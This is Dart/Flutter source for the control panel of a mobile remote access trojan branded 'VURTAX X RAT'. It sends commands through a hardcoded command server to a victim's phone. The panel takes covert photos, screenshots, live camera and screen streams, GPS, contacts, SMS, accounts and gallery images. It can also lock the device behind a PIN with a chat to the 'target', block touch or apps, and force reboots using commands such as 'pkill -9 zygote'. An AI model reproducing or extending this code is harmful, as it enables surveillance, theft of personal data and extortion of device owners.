import 'dart:async';
import 'dart:ui';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ─────────────────────────────────────────────────────────────────────────────
// VURTAX X RAT THEME (SAMA PERSIS DENGAN dashboard_page.dart)
// ─────────────────────────────────────────────────────────────────────────────
class ControlTheme {
  // ─── WARNA DARI DASHBOARD_PAGE.DART ──────────────────────────────
  static const bg            = Color(0xFFDCEEFB);  // biru muda lembut
  static const card          = Color(0xFFFFFFFF);  // putih
  static const cardAlt       = Color(0xFFF0F7FF);  // biru sangat pucat
  static const border        = Color(0xFF42A5F5);  // biru cerah
  static const red           = Color(0xFF1565C0);  // biru tua — WARNA UTAMA
  static const cyan          = Color(0xFF1565C0);
  static const green         = Color(0xFF1565C0);
  static const pink          = Color(0xFF1565C0);
  static const orange        = Color(0xFF1565C0);
  static const blue          = Color(0xFF1565C0);
  static const purple        = Color(0xFF1565C0);
  static const yellow        = Color(0xFF1565C0);
  static const white         = Color(0xFFFFFFFF);
  static const white54       = Color(0x8A000000);
  static const white24       = Color(0x3D000000);
  static const liveBlue      = Color(0xFF1565C0);
  static const liveRed       = Color(0xFF1565C0);
  static const liveYellow    = Color(0xFF1565C0);

  // ─── ALIAS UNTUK KONSISTENSI ──────────────────────────────────────
  static const surface        = Color(0xFFFFFFFF);  // putih
  static const surface2       = Color(0xFFF0F7FF);  // biru pucat
  static const surface3       = Color(0xFFE3F0FF);  // biru lebih pucat
  static const cardDark       = Color(0xFFF5F9FF);  // putih kebiruan
  
  static const accent1        = Color(0xFF1565C0);  // biru tua
  static const accent2        = Color(0xFF42A5F5);  // biru cerah
  static const accent3        = Color(0xFF1565C0);  // biru tua
  static const success        = Color(0xFF1565C0);  // biru tua (dulu hijau)
  static const warning        = Color(0xFF1565C0);  // biru tua (dulu oranye)
  static const error          = Color(0xFF1565C0);  // biru tua (dulu merah)
  
  static const textPrimary    = Color(0xFF000000);  // hitam
  static const textSec        = Color(0xFF3D6080);  // biru gelap
  static const textMuted      = Color(0xFF8A9BB0);  // abu-abu biru
  
  static const shadow         = Color(0x40000000);
  static const shadowHeavy    = Color(0x80000000);
}

// ─── SHADOW UTILITIES ──────────────────────────────────────────────────────
class ControlShadowUtils {
  static List<BoxShadow> get soft {
    return const [
      BoxShadow(color: ControlTheme.shadow, blurRadius: 8, offset: Offset(0, 2)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 2, offset: Offset(0, 1)),
    ];
  }
  
  static List<BoxShadow> get medium {
    return const [
      BoxShadow(color: ControlTheme.shadow, blurRadius: 16, offset: Offset(0, 4)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 4, offset: Offset(0, 2)),
    ];
  }
  
  static List<BoxShadow> get heavy {
    return const [
      BoxShadow(color: ControlTheme.shadow, blurRadius: 24, offset: Offset(0, 8)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 8, offset: Offset(0, 4)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 2, offset: Offset(0, 1)),
    ];
  }
  
  static List<BoxShadow> get card {
    return const [
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 20, offset: Offset(0, 10)),
      BoxShadow(color: ControlTheme.shadow, blurRadius: 6, offset: Offset(0, 2)),
    ];
  }
  
  static List<BoxShadow> get glow {
    return [
      BoxShadow(color: ControlTheme.blue.withOpacity(0.3), blurRadius: 12, offset: Offset(0, 0)),
      BoxShadow(color: ControlTheme.shadowHeavy, blurRadius: 8, offset: Offset(0, 4)),
    ];
  }
}

// ─────────────────────────────────────────────────────────────────────────────
// CONTROL CENTER — Tab Dashboard (VURTAX X RAT THEME)
// ─────────────────────────────────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage> with SingleTickerProviderStateMixin {

  // ── Constants ──────────────────────────────────────────────────────────────
  static const _kBase  = 'http://cp.zyrostore.id:3594';
  static const Set<String> _needPoll = {
    'take_photo','get_screen','get_location','track_gps',
    'get_contacts','dump_contacts','get_gmails','get_sms','get_gallery',
  };

  // ── State ──────────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameN = ValueNotifier<int>(0);

  // Chat
  final List<Map<String,String>> _chat = [];
  final _chatCtrl   = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  // App Block State
  bool _whatsappBlocked = false;

  // ── Device info ────────────────────────────────────────────────────────────
  String get _id      => widget.targetDevice?['id']?.toString()      ?? 'unknown';
  String get _model   => widget.targetDevice?['model']?.toString()   ?? 'Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 6, vsync: this);
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _cmd('force_open', silent: true);
    });
    _chatTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameN.dispose();
    super.dispose();
  }

  // ── Log ────────────────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11,19)}]  $m');
      if (_log.length > 50) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = ControlTheme.error}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: c.withOpacity(0.9),
      content: Text(
        m,
        style: const TextStyle(
          fontWeight: FontWeight.w600,
          color: Colors.white,
          fontSize: 12,
          fontFamily: 'Astral',
        ),
      ),
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
    ));
  }

  // ─────────────────────────────────────────────────────────────────────────
  // SEND COMMAND
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _cmd(String cmd, {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') { if (!silent) _toast('ID target tidak valid'); return; }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http.post(
        Uri.parse('$_kBase/api/send-command'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
      ).timeout(const Duration(seconds: 12));

      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Terkirim', c: ControlTheme.success);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) { _addLog('Error $cmd (${res.statusCode})'); _toast('Target offline'); }
      }
    } catch (e) {
      if (!silent) { _addLog('Conn error: $e'); _toast('Koneksi gagal'); }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // POLL RESPONSE
  // ─────────────────────────────────────────────────────────────────────────
  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' ? 60 : 30;
    int n = 0; bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http.get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) { _onResponse(cmd, d['data']); got = true; }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) { _toast('Foto kosong'); return; }
        _addLog('Foto diterima');
        _imgDialog(b, 'Foto Target');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot diterima');
        _imgDialog(b, 'Screenshot');
        break;
      case 'get_location': case 'track_gps':
        _addLog('GPS diterima');
        _locationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts': case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} kontak');
        _contactsSheet(l);
        break;
      case 'get_gmails':
        _addLog('Akun diterima');
        _textDialog('Akun & Email', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _smsSheet(s);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} foto gallery');
        _gallerySheet(imgs);
        break;
      default:
        _addLog('$cmd selesai');
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true; _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'KAMERA DEPAN' : 'KAMERA BELAKANG')
          : 'SCREEN';
      _frmCount = 0; _fps = 0; _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) { _liveTimer?.cancel(); return; }
      try {
        final res = await http.get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes; _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) { _fps = (_frmCount * 1000 / ms).round(); _frmCount = 0; _fpsTs = DateTime.now(); }
            });
            _frameN.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) setState(() { _liveOn = false; _frame = null; });
    _cmd('live_stop', silent: true);
    _addLog('Live dihentikan');
  }

  // ─────────────────────────────────────────────────────────────────────────
  // CHAT
  // ─────────────────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http.get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({'from': m['from']?.toString() ?? '','text': m['text']?.toString() ??'','time': m['time']?.toString() ??''});
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({'from': 'owner', 'text': text.trim(), 'time': TimeOfDay.now().format(context)}));
    _scrollChat();
    try {
      await http.post(Uri.parse('$_kBase/api/lock-chat/$_id'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
    });
  }

  // ─────────────────────────────────────────────────────────────────────────
  // BUILD
  // ─────────────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: ControlTheme.bg,
      body: Column(
        children: [
          _buildAppBar(),
          Expanded(child: _buildTabBarView()),
        ],
      ),
    );
  }

  Widget _buildAppBar() {
    return Container(
      padding: const EdgeInsets.fromLTRB(16, 48, 16, 16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topCenter,
          end: Alignment.bottomCenter,
          colors: [
            ControlTheme.card,
            ControlTheme.bg,
          ],
        ),
        border: Border(
          bottom: BorderSide(
            color: ControlTheme.border.withOpacity(0.3),
            width: 0.5,
          ),
        ),
      ),
      child: Row(
        children: [
          // Back button
          GestureDetector(
            onTap: () {
              if (_liveOn) _stopLive();
              Navigator.pop(context);
            },
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [ControlTheme.red, ControlTheme.blue],
                ),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: ControlTheme.border.withOpacity(0.3),
                  width: 0.5,
                ),
              ),
              child: const Icon(Icons.arrow_back_ios_new, color: Colors.white, size: 18),
            ),
          ),
          const SizedBox(width: 12),
          
          // Logo HP and Device Info
          Expanded(
            child: Row(
              children: [
                Container(
                  width: 44,
                  height: 44,
                  decoration: BoxDecoration(
                    gradient: const LinearGradient(colors: [ControlTheme.red, ControlTheme.blue]),
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(
                      color: ControlTheme.border.withOpacity(0.3),
                      width: 0.5,
                    ),
                  ),
                  child: const Icon(Icons.phone_android, color: Colors.white, size: 24),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Text(
                        _model,
                        style: const TextStyle(
                          fontSize: 15,
                          fontWeight: FontWeight.bold,
                          color: ControlTheme.textPrimary,
                          fontFamily: 'Astral',
                        ),
                        overflow: TextOverflow.ellipsis,
                      ),
                      const SizedBox(height: 4),
                      Row(
                        children: [
                          Icon(Icons.battery_std, color: _getBatteryColor(), size: 14),
                          const SizedBox(width: 4),
                          Text(
                            '$_battery%',
                            style: TextStyle(
                              fontSize: 9,
                              color: _getBatteryColor(),
                              fontWeight: FontWeight.w600,
                              fontFamily: 'Astral',
                            ),
                          ),
                          const SizedBox(width: 8),
                          Container(width: 1, height: 10, color: ControlTheme.textMuted),
                          const SizedBox(width: 8),
                          Icon(Icons.circle, color: _liveOn ? ControlTheme.red : ControlTheme.success, size: 6),
                          const SizedBox(width: 4),
                          Text(
                            _liveOn ? 'LIVE' : 'Online',
                            style: TextStyle(
                              fontSize: 8,
                              color: _liveOn ? ControlTheme.red : ControlTheme.success,
                              fontFamily: 'Astral',
                            ),
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              ],
            ),
          ),
          
          // Actions
          if (_liveOn) ...[
            Container(
              margin: const EdgeInsets.only(right: 8),
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
              decoration: BoxDecoration(
                color: ControlTheme.red.withOpacity(0.15), 
                borderRadius: BorderRadius.circular(6), 
                border: Border.all(color: ControlTheme.red.withOpacity(0.3))
              ),
              child: Text(
                '$_fps fps',
                style: const TextStyle(
                  fontSize: 8,
                  fontWeight: FontWeight.bold,
                  color: ControlTheme.red,
                  fontFamily: 'Astral',
                ),
              ),
            ),
          ],
          if (_sending) ...[
            const Padding(
              padding: EdgeInsets.only(right: 8),
              child: SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2, color: ControlTheme.red)),
            ),
          ],
          GestureDetector(
            onTap: () { setState(() {}); _cmd('force_open', silent: true); },
            child: Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [ControlTheme.surface2, ControlTheme.surface3],
                ),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                  color: ControlTheme.border.withOpacity(0.15),
                  width: 0.5,
                ),
              ),
              child: Icon(Icons.refresh_rounded, color: ControlTheme.textMuted, size: 18),
            ),
          ),
        ],
      ),
    );
  }

  Color _getBatteryColor() {
    final bat = int.tryParse(_battery) ?? 0;
    if (bat >= 70) return ControlTheme.success;
    if (bat >= 30) return ControlTheme.warning;
    return ControlTheme.error;
  }

  Widget _buildTabBarView() {
    return Column(
      children: [
        // Tab Bar
        Container(
          margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
          decoration: BoxDecoration(
            color: ControlTheme.cardAlt,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(
              color: ControlTheme.border.withOpacity(0.15),
              width: 0.5,
            ),
          ),
          child: TabBar(
            controller: _tabs,
            isScrollable: true,
            indicatorColor: ControlTheme.red,
            indicatorWeight: 2,
            labelColor: ControlTheme.red,
            unselectedLabelColor: ControlTheme.textMuted,
            labelStyle: const TextStyle(
              fontSize: 11,
              fontWeight: FontWeight.w600,
              fontFamily: 'Astral',
            ),
            unselectedLabelStyle: const TextStyle(
              fontSize: 9,
              fontFamily: 'Astral',
            ),
            tabs: const [
              Tab(text: 'LIVE'),
              Tab(text: 'CAM'),
              Tab(text: 'INTEL'),
              Tab(text: 'AUDIO'),
              Tab(text: 'CHAT'),
              Tab(text: 'DEV'),
            ],
          ),
        ),
        // Tab Bar View
        Expanded(
          child: TabBarView(controller: _tabs, children: [
            _pageLive(),
            _pageCamera(),
            _pageIntel(),
            _pageAudio(),
            _pageLock(),
            _pageDevice(),
          ]),
        ),
      ],
    );
  }

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LIVE STREAM
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLive() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      // Preview
      Container(
        height: _liveOn ? 220 : 90,
        decoration: BoxDecoration(
          color: ControlTheme.card,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: _liveOn ? ControlTheme.red.withOpacity(0.4) : ControlTheme.border.withOpacity(0.15),
            width: _liveOn ? 1.5 : 0.5,
          ),
          boxShadow: ControlShadowUtils.card,
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(11),
          child: _liveOn && _frame != null
              ? Image.memory(_frame!, fit: BoxFit.contain, gaplessPlayback: true, filterQuality: FilterQuality.low)
              : Center(child: Text(
                  _liveOn ? 'Waiting for frames...' : 'Stream inactive',
                  style: TextStyle(
                    color: ControlTheme.textMuted,
                    fontSize: 10,
                    fontFamily: 'Astral',
                  ),
                )),
        ),
      ),
      const SizedBox(height: 14),
      _buildGridButtons([
        _GridButton('Live Camera', ControlTheme.red, Icons.videocam_rounded, () {
          _showCamPicker((side) { _startLive('live_camera_start', side); _showLiveDialog(); });
        }),
        _GridButton('Live Screen', ControlTheme.blue, Icons.desktop_windows_rounded, () {
          _startLive('live_screen_start', ''); _showLiveDialog();
        }),
        if (_liveOn)
          _GridButton('Stop Live', ControlTheme.error, Icons.stop_rounded, _stopLive),
      ]),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: CAMERA
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageCamera() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Take Photo', ControlTheme.blue, Icons.camera_alt_rounded, () => _showCamPicker((s) => _cmd('take_photo', extra: s))),
        _GridButton('Screenshot', ControlTheme.red, Icons.screenshot_monitor, () => _cmd('get_screen')),
        _GridButton('Set Wallpaper', ControlTheme.blue, Icons.wallpaper_rounded, () => _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v))),
        _GridButton('Strobe ON', ControlTheme.red, Icons.flash_on_rounded, () => _cmd('flash_strobe')),
        _GridButton('Strobe OFF', ControlTheme.textMuted, Icons.flash_off_rounded, () => _cmd('stop_strobe')),
        _GridButton('Torch ON', ControlTheme.red, Icons.light_rounded, () => _cmd('torch_on')),
        _GridButton('Torch OFF', ControlTheme.textMuted, Icons.flash_off_rounded, () => _cmd('torch_off')),
      ], columns: 2),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: INTELLIGENCE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageIntel() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Contacts', ControlTheme.blue, Icons.contacts_rounded, () => _cmd('get_contacts')),
        _GridButton('GPS Location', ControlTheme.success, Icons.my_location_rounded, () => _cmd('get_location')),
        _GridButton('Gmail & Accounts', ControlTheme.red, Icons.account_circle_rounded, () => _cmd('get_gmails')),
        _GridButton('SMS Inbox', ControlTheme.red, Icons.sms_rounded, () => _cmd('get_sms')),
        _GridButton('Notifications', ControlTheme.blue, Icons.notifications_rounded, () => _fetchNotif()),
        _GridButton('Gallery (5 Photos)', ControlTheme.red, Icons.photo_library_rounded, () => _cmd('get_gallery', extra: '5')),
        _GridButton('Request Notif Access', ControlTheme.textMuted, Icons.security_rounded, () => _cmd('open_notification_settings')),
        _GridButton('Touch Block', ControlTheme.error, Icons.touch_app_rounded, () => _showTouchBlockDialog()),
        _GridButton('App Blocked', ControlTheme.blue, Icons.block_rounded, () => _showAppBlockSheet()),
      ], columns: 2),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: AUDIO
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageAudio() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Play Audio', ControlTheme.blue, Icons.play_circle_rounded, () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v))),
        _GridButton('Stop Audio', ControlTheme.textMuted, Icons.stop_circle_rounded, () => _cmd('stop_audio')),
        _GridButton('Vibrate Loop', ControlTheme.red, Icons.vibration_rounded, () => _cmd('vibrate_loop')),
        _GridButton('Open URL', ControlTheme.red, Icons.open_in_browser, () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v))),
        _GridButton('Kill WiFi', ControlTheme.red, Icons.wifi_off_rounded, () => _cmd('kill_wifi')),
      ], columns: 2),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: LOCK & CHAT
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageLock() => Column(
    children: [
      Expanded(
        child: SingleChildScrollView(
          padding: const EdgeInsets.all(16),
          child: Column(
            children: [
              _buildGridButtons([
                _GridButton('Lock Live + Chat', ControlTheme.error, Icons.lock_rounded, () { _lockLiveDialog(); }),
                _GridButton('Lock Device', ControlTheme.blue, Icons.lock_outline_rounded, () {
                  _inputDialog('Lock Device', 'Pesan di layar lock', (msg) {
                    _inputDialog('PIN Unlock', '4 digit PIN', (pin) {
                      _cmd('hard_lock', extra: '$msg|$pin');
                    }, isNumber: true, hint: '1234');
                  });
                }),
                _GridButton('Unlock Device', ControlTheme.success, Icons.lock_open_rounded, () => _cmd('unlock')),
                _GridButton('Overlay Lock', ControlTheme.red, Icons.layers_rounded, () => _showOverlayLockDialog()),
              ], columns: 2),
              const SizedBox(height: 20),
              
              // Chat section
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: ControlTheme.cardAlt,
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(
                    color: ControlTheme.border.withOpacity(0.15),
                    width: 0.5,
                  ),
                ),
                child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                  Row(children: [
                    Icon(Icons.chat_rounded, color: ControlTheme.red, size: 16),
                    const SizedBox(width: 8),
                    Text(
                      'CHAT WITH TARGET',
                      style: const TextStyle(
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                        color: ControlTheme.textPrimary,
                        fontFamily: 'Astral',
                      ),
                    ),
                  ]),
                  const SizedBox(height: 10),
                  Container(
                    height: 200,
                    decoration: BoxDecoration(
                      color: ControlTheme.card,
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: ControlTheme.border.withOpacity(0.1),
                        width: 0.5,
                      ),
                    ),
                    child: _chat.isEmpty
                        ? Center(child: Text('No messages yet', style: TextStyle(color: ControlTheme.textMuted, fontSize: 10, fontFamily: 'Astral')))
                        : ListView.builder(
                            controller: _chatScroll,
                            padding: const EdgeInsets.all(10),
                            itemCount: _chat.length,
                            itemBuilder: (_, i) {
                              final m = _chat[i];
                              final isOwner = m['from'] == 'owner';
                              return Align(
                                alignment: isOwner ? Alignment.centerRight : Alignment.centerLeft,
                                child: Container(
                                  margin: const EdgeInsets.symmetric(vertical: 3),
                                  padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                                  constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.6),
                                  decoration: BoxDecoration(
                                    gradient: isOwner
                                        ? const LinearGradient(colors: [ControlTheme.red, ControlTheme.blue])
                                        : null,
                                    color: isOwner ? null : ControlTheme.cardAlt,
                                    borderRadius: BorderRadius.circular(12),
                                    border: isOwner ? null : Border.all(
                                      color: ControlTheme.border.withOpacity(0.15),
                                      width: 0.5,
                                    ),
                                  ),
                                  child: Column(crossAxisAlignment: isOwner ? CrossAxisAlignment.end : CrossAxisAlignment.start, children: [
                                    Text(m['text'] ?? '', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 11, fontFamily: 'Astral')),
                                    const SizedBox(height: 2),
                                    Text(m['time'] ?? '', style: TextStyle(color: ControlTheme.textMuted, fontSize: 8, fontFamily: 'Astral')),
                                  ]),
                                ),
                              );
                            }),
                  ),
                ]),
              ),
            ],
          ),
        ),
      ),
      // Chat input bar
      Container(
        padding: const EdgeInsets.fromLTRB(12, 8, 12, 12),
        decoration: BoxDecoration(
          color: ControlTheme.card,
          border: Border(
            top: BorderSide(
              color: ControlTheme.border.withOpacity(0.15),
              width: 0.5,
            ),
          ),
        ),
        child: Row(children: [
          Expanded(child: TextField(
            controller: _chatCtrl,
            style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 11, fontFamily: 'Astral'),
            decoration: InputDecoration(
              hintText: 'Type message to target...',
              hintStyle: TextStyle(color: ControlTheme.textMuted, fontSize: 10, fontFamily: 'Astral'),
              filled: true,
              fillColor: ControlTheme.cardAlt,
              contentPadding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
              border: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
                borderSide: BorderSide.none,
              ),
              focusedBorder: OutlineInputBorder(
                borderRadius: BorderRadius.circular(20),
                borderSide: BorderSide(color: ControlTheme.border.withOpacity(0.3)),
              ),
            ),
            onSubmitted: _sendChat,
          )),
          const SizedBox(width: 8),
          GestureDetector(
            onTap: () => _sendChat(_chatCtrl.text),
            child: Container(
              padding: const EdgeInsets.all(11),
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [ControlTheme.red, ControlTheme.blue]),
                shape: BoxShape.circle,
                border: Border.all(
                  color: ControlTheme.border.withOpacity(0.2),
                  width: 0.5,
                ),
              ),
              child: const Icon(Icons.send_rounded, color: Colors.white, size: 16)),
          ),
        ]),
      ),
    ],
  );

  // ─────────────────────────────────────────────────────────────────────────
  // TAB: DEVICE
  // ─────────────────────────────────────────────────────────────────────────
  Widget _pageDevice() => SingleChildScrollView(
    padding: const EdgeInsets.all(16),
    child: Column(children: [
      _buildGridButtons([
        _GridButton('Restart Device', ControlTheme.blue, Icons.restart_alt_rounded, () {
          showDialog(context: context, builder: (_) => AlertDialog(
            backgroundColor: ControlTheme.card,
            shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.circular(16),
              side: BorderSide(color: ControlTheme.border.withOpacity(0.2)),
            ),
            title: Text('Restart Device', style: const TextStyle(color: ControlTheme.textPrimary, fontSize: 14, fontWeight: FontWeight.bold, fontFamily: 'Astral')),
            content: Text(
              'Target device will restart.\n\nUsing PowerManager reflection — no root or device admin required.',
              style: TextStyle(color: ControlTheme.textSec, fontSize: 11, height: 1.5, fontFamily: 'Astral')),
            actions: [
              TextButton(
                onPressed: () => Navigator.pop(context),
                child: Text('Cancel', style: TextStyle(color: ControlTheme.textMuted, fontSize: 11, fontFamily: 'Astral')),
              ),
              ElevatedButton(
                style: ElevatedButton.styleFrom(
                  backgroundColor: ControlTheme.red,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
                ),
                onPressed: () { Navigator.pop(context); _cmd('reboot_device'); },
                child: Text('Restart', style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.bold, fontFamily: 'Astral'))),
            ],
          ));
        }),
        _GridButton('Wake Up Target', ControlTheme.success, Icons.wb_sunny_rounded, () => _cmd('force_open')),
        _GridButton('SSID WiFi', ControlTheme.red, Icons.wifi_rounded, () => _getSSID()),
      ], columns: 2),
      const SizedBox(height: 20),
      Container(
        padding: const EdgeInsets.all(14),
        decoration: BoxDecoration(
          color: ControlTheme.cardAlt,
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: ControlTheme.border.withOpacity(0.15),
            width: 0.5,
          ),
        ),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text(
            'Restart Methods',
            style: const TextStyle(
              fontSize: 11,
              fontWeight: FontWeight.w600,
              color: ControlTheme.textPrimary,
              fontFamily: 'Astral',
            ),
          ),
          const SizedBox(height: 8),
          _infoRow('1', 'PowerManager reflection (no root required)'),
          _infoRow('2', 'DevicePolicyManager (if admin active)'),
          _infoRow('3', 'su -c reboot (root)'),
          _infoRow('4', 'am crash system_server'),
          _infoRow('5', 'pkill -9 zygote'),
        ]),
      ),
    ]),
  );

  // ─────────────────────────────────────────────────────────────────────────
  // NEW FEATURES
  // ─────────────────────────────────────────────────────────────────────────

